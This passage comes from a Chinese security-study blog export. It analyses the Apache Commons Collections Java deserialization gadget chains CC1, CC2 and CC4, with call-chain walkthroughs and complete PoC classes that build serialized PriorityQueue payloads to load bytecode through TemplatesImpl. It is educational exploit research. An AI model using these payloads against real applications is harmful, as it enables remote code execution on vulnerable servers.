src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/dc51b758880a439ca54c06bfe5a168e8.png\"></p>\n<p>循环调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/f84395053c374f15915ec4fc76de32af.png\"></p>\n<p>循环调用的第一个为 ConstantTransformer，通过构造方法已经变为Runtime</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/cb788f76d3b34491b49fa95e888dbf1b.png\"></p>\n<p>到此cc1完成</p>\n<h1 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p>来自  <a href=\"https://xz.aliyun.com/t/9873\">CC链学习-上 - 先知社区 (aliyun.com)</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/img_convert/4d1f61129d1b0b786444f0ae546724cd.png\" alt=\"img\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/953cb0c5ee4f472888fe2270916ab774.png\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.bilibili.com/video/BV1no4y1U7E1\">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p>\n<p><a href=\"https://ccship.cn/2021/10/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommons-collections1%E9%93%BE/\">Java反序列化之Commons-Collections1链 – cc (ccship.cn)</a></p>\n","categories":["Java反序列化"]},{"title":"CommonsCollections-2,4","url":"/2023/12/25/CommonsCollections-2,4/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>简单来说CC2就是从 <strong>Serializable</strong>的 <strong>readObject()</strong> ⽅法到 <strong>Transformer</strong> 的 <strong>transform()</strong> ⽅法的调⽤链，<strong>首先 CommonsCollections3 中无法使用，因为在3的版本中 TransformingComparator 无法序列化。其次 只有 CommonsCollections4的4.0 可以使用</strong>，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化，进而衍生出CC4。</p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><p>添加maven依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;commons-collections4&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;4.0&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<h1 id=\"CC2分析\"><a href=\"#CC2分析\" class=\"headerlink\" title=\"CC2分析\"></a>CC2分析</h1><h2 id=\"调用链\"><a href=\"#调用链\" class=\"headerlink\" title=\"调用链\"></a>调用链</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">-&gt;PriorityQueue.readObject()</span><br><span class=\"line\">      -&gt;PriorityQueue.heapify()</span><br><span class=\"line\">          -&gt;PriorityQueue.siftDown()</span><br><span class=\"line\">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class=\"line\">                -&gt;TransformingComparator.compare()</span><br><span class=\"line\">                    -&gt;InvokerTransformer.transform()</span><br><span class=\"line\">                        -&gt;TemplatesImpl.newTransformer()</span><br><span class=\"line\">                        -&gt;…………</span><br></pre></td></tr></table></figure>\n\n<p><strong>PriorityQueue</strong>的 <strong>readObject()</strong> 调用 <strong>heapify()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/6454f047e8384e21a101f168cf24f16d.png\"></p>\n<p>调用<strong>siftDown</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/be6427f723dd4110addb8358c7abeba7.png\"></p>\n<p>调用<strong>siftDownUsingComparator</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/dd49e1e0077f41d08a466ba442101297.png\"></p>\n<p>调用 comparator的 <strong>compare</strong>方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/9b1b6fa969a24e77911304449fd07b26.png\"></p>\n<p>在<strong>TransformingComparator</strong>的<strong>compare方法</strong>调用 transform 方法，这里就可以接上 <strong>InvokerTransformer</strong> 或者 <strong>ChainedTransformer</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/17c0fd1eba42473295799e56fa40caa6.png\"></p>\n<p>再接上了 <strong>TemplatesImpl</strong>的 **newTransformer **方法加载恶意字节(CC3的利用方法)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/a355469c2d95472f8a670c33bf1d630f.png\"></p>\n<p>大概流程</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PriorityQueue</span>&lt;<span class=\"title\">E</span>&gt; <span class=\"keyword\">extends</span> <span class=\"title\">AbstractQueue</span>&lt;<span class=\"title\">E</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">java</span>.<span class=\"title\">io</span>.<span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> Object[] queue;   <span class=\"comment\">//关键点，可以传入 TemplatesImpl</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Comparator&lt;? <span class=\"keyword\">super</span> E&gt; comparator;     <span class=\"comment\">//关键点可以反射设置我们自己的 Comparator</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//关键点，反序列化时字段执行的 readObject</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">readObject</span><span class=\"params\">(java.io.ObjectInputStream s)</span></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"keyword\">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//关键点，调用 heapify() 排序</span></span><br><span class=\"line\">        heapify();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//跟进 heapify() 方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">heapify</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = (size &gt;&gt;&gt; <span class=\"number\">1</span>) - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">            siftDown(i, (E) queue[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">siftDown</span><span class=\"params\">(<span class=\"keyword\">int</span> k, E x)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (comparator != <span class=\"keyword\">null</span>)</span><br><span class=\"line\">            siftDownUsingComparator(k, x);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            siftDownComparable(k, x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//跟进 siftDownUsingComparator 方法，可以看到这里调用了我们自定义的 Comparator</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">siftDownUsingComparator</span><span class=\"params\">(<span class=\"keyword\">int</span> k, E x)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> half = size &gt;&gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (k &lt; half) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> child = (k &lt;&lt; <span class=\"number\">1</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">            Object c = queue[child];</span><br><span class=\"line\">            <span class=\"keyword\">int</span> right = child + <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (right &lt; size &amp;&amp;</span><br><span class=\"line\">                comparator.compare((E) c, (E) queue[right]) &gt; <span class=\"number\">0</span>)    <span class=\"comment\">//关键点</span></span><br><span class=\"line\">                c = queue[child = right];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (comparator.compare(x, (E) c) &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            queue[k] = c;</span><br><span class=\"line\">            k = child;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        queue[k] = x;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"构造细节\"><a href=\"#构造细节\" class=\"headerlink\" title=\"构造细节\"></a>构造细节</h1><p>在readObject中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/38494a736085485cb981708d96ea2571.png\"></p>\n<p><code>s.defaultReadObject()</code>调用默认的方法，利用readInt读取了数组的大小，接着通过for循环中<code>s.readObject()</code>读取Queue中的元素，这里需要queue必须有元素，后续利用链需要</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">priorityQueue.add(<span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p>进入heapify()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/83191449afdc43cf97426aea90a1f766.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;意思是无符号右移，忽略符号位，空位都以0补齐</span><br></pre></td></tr></table></figure>\n\n<p>这里**(size &gt;&gt;&gt; 1) - 1** 需要大于等于0，所以size也就需要为2，所以就需要添加两个元素</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">priorityQueue.add(<span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p>进入siftDown函数，<strong>传入 0与queue的第一个元素</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/0ddadd80f59b4af38d68d5eff6bf3fbf.png\"></p>\n<p>comparator不为空进入siftDownUsingComparator传入依然是 <strong>0与queue的第一个元素</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/13a2e5a640c147a6b90137a109422531.png\"></p>\n<p>此时<strong>size=2, half=1, k=0, x=queue[0]</strong> 进入while循环<strong>child=1, c=queue[1], right=2</strong> 所以进入 <strong>if (comparator.compare(x, (E) c) &lt;= 0)</strong></p>\n<p>然后接上后面的链子</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/93e182ea3e7d4d04be5c3643c0b5bb61.png\"></p>\n<p>这里就有个小问题，既然在这里传进来只用obj1，也就是queue[0]就可以达到目的，为什么poc会添加两个templates，这样构造不也可以吗，其实也是可以的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Object[] objects &#x3D; new Object[]&#123;templates,1&#125;;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/8346e4fd22084965a2f28c63ff3e0e05.png\"></p>\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;C:\\\\Users\\\\cys\\\\Desktop/Calc.class&quot;</span>));</span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//templates.newTransformer();</span></span><br><span class=\"line\"></span><br><span class=\"line\">        InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;newTransformer&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;&#125;, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//TransformingComparator 实例</span></span><br><span class=\"line\">        TransformingComparator comparator = <span class=\"keyword\">new</span> TransformingComparator(invokerTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//PriorityQueue 实例</span></span><br><span class=\"line\">        PriorityQueue priorityQueue = <span class=\"keyword\">new</span> PriorityQueue(<span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"comment\">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反射设置 Field</span></span><br><span class=\"line\">        Object[] objects = <span class=\"keyword\">new</span> Object[]&#123;templates,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;queue&quot;</span>, objects);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;comparator&quot;</span>, comparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//serialize(priorityQueue);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"CC4分析\"><a href=\"#CC4分析\" class=\"headerlink\" title=\"CC4分析\"></a>CC4分析</h1><p>上面 CC2 说了因为 CommonsCollections4 <strong>除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承</strong>，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，CC4 只是将 CC2 中的  <strong>InvokerTransformer 替换为了 InstantiateTransformer</strong></p>\n<h2 id=\"调用链-1\"><a href=\"#调用链-1\" class=\"headerlink\" title=\"调用链\"></a>调用链</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">-&gt;PriorityQueue.readObject()</span><br><span class=\"line\">      -&gt;PriorityQueue.heapify()</span><br><span class=\"line\">          -&gt;PriorityQueue.siftDown()</span><br><span class=\"line\">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class=\"line\">                 -&gt;TransformingComparator.compare()</span><br><span class=\"line\">                    -&gt;ChainedTransformer.transform()</span><br><span class=\"line\">                        -&gt;ConstantTransformer.transform()</span><br><span class=\"line\">                                    -&gt;InstantiateTransformer.transform()</span><br><span class=\"line\">                             -&gt;TrAXFilter.TrAXFilter()</span><br><span class=\"line\">                                 -&gt;TemplatesImpl.newTransformer()</span><br><span class=\"line\">                                        -&gt;…………</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"poc-1\"><a href=\"#poc-1\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC4</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;C:\\\\Users\\\\cys\\\\Desktop/Calc.class&quot;</span>));</span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InstantiateTransformer(<span class=\"keyword\">new</span> Class[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;templates&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        TransformingComparator comparator = <span class=\"keyword\">new</span> TransformingComparator(chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//PriorityQueue 实例</span></span><br><span class=\"line\">        PriorityQueue priorityQueue = <span class=\"keyword\">new</span> PriorityQueue(<span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"comment\">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反射设置 Field</span></span><br><span class=\"line\">        Object[] objects = <span class=\"keyword\">new</span> Object[]&#123;templates,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;queue&quot;</span>, objects);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;comparator&quot;</span>, comparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(priorityQueue);</span><br><span class=\"line\">        <span class=\"comment\">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Java反序列化"]},{"title":"CommonsCollections-1(下)","url":"/2023/12/25/CommonsCollections-1(%E4%B8%8B)/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p><strong>CC1链之LazyMap链</strong></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>这次在寻找的 transform 入口中，找到 <strong>LazyMap</strong> 中的get方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">get</span><span class=\"params\">(Object key)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// create value for key if key is not currently in the map</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (map.containsKey(key) == <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">            Object value = factory.transform(key);</span><br><span class=\"line\">            map.put(key, value);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> map.get(key);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p><strong>factory可控</strong>，这样可以变为ChainedTransformer，剩下就是循环调用，向上寻找调用get方法处，依旧是在</p>\n<p><strong>AnnotationInvocationHandler.class</strong> 中的 <strong>invoke方法</strong>中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class=\"line\">        String var4 = var2.getName();</span><br><span class=\"line\">        Class[] var5 = var2.getParameterTypes();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var4.equals(<span class=\"string\">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class=\"number\">1</span> &amp;&amp; var5[<span class=\"number\">0</span>] == Object.class) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.equalsImpl(var3[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var5.length != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> AssertionError(<span class=\"string\">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">/***/</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">switch</span>(var7) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/***/</span></span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                Object var6 = <span class=\"keyword\">this</span>.memberValues.get(var4);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (var6 == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                   <span class=\"comment\">/***/</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    